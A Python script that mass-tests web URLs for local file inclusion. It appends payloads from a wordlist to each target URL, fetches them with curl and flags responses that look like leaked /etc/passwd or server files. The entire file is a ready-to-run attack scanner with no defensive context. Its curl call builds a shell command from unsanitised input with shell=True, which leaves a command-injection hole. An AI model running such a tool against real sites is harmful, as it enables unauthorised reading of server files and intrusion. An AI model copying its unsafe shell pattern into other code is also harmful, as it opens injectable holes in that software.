import re
import subprocess
import time
from termcolor import colored

# Read URLs from file
with open('urls.txt', 'r') as f:
    urls = f.read().splitlines()

# Read payloads from file
with open('lfi_wordlist.txt', 'r') as f:
    payloads = f.read().splitlines()

# Define LFI errors
lfi_errors = ["root:x:", "bin:x", "daemon", "MySQL", "syntax", "bin:x", "mysql_", "mysql", "shutdown", "ftp", "cpanel", "/bin/bash", "/usr/sbin", "www-data", "root:x:0:0:root:", "syslog"]

# Define regex pattern to extract elapsed time from curl output
time_pattern = re.compile(r"elapsed (\d+:\d+\.\d+)")

total_requests = len(urls) * len(payloads)
progress = 0
start_time = time.time()

# Loop through each URL
for url in urls:
    # Loop through each payload
    for payload in payloads:
        # Escape double quotes in the payload
        payload = payload.replace('"', r'\"')

        # Test URL with payload and get source code
        command = f'curl -s -i --url "{url}{payload}"'
        try:
            output_bytes = subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError as e:
            print(f"{colored('Error:', 'red')} {e}")
            continue

        # Decode output from byte string to UTF-8 string
        output_str = output_bytes.decode('utf-8', errors='ignore')

        # Check for LFI errors and print message if so
        lfi_matches = [error for error in lfi_errors if error in output_str]
        if lfi_matches:
            message = f"\n{colored('LOCAL FILE INCLUSION ERROR FOUND ON', 'white')} {colored(url+payload, 'red')}"
            with open('lfi_errors.txt', 'a') as file:
                file.write(url+payload+'\n')
            for match in lfi_matches:
                print(colored(" Match Words: " + match, 'cyan'))
            print(message)
        else:
            # Print safe URLs in green text
            print(colored(f"{url+payload}: safe", 'green'))
    
        # Update progress and calculate estimated remaining time
        progress += 1
        elapsed_seconds = time.time() - start_time
        remaining_seconds = (total_requests - progress) * (elapsed_seconds / progress)
        remaining_hours = int(remaining_seconds // 3600)
        remaining_minutes = int((remaining_seconds % 3600) // 60)
        percent_complete = round(progress / total_requests * 100, 2)

        # Print progress update
        print(f"{colored('Progress:', 'blue')} {progress}/{total_requests} ({percent_complete}%) - {remaining_hours}h:{remaining_minutes:02d}m")
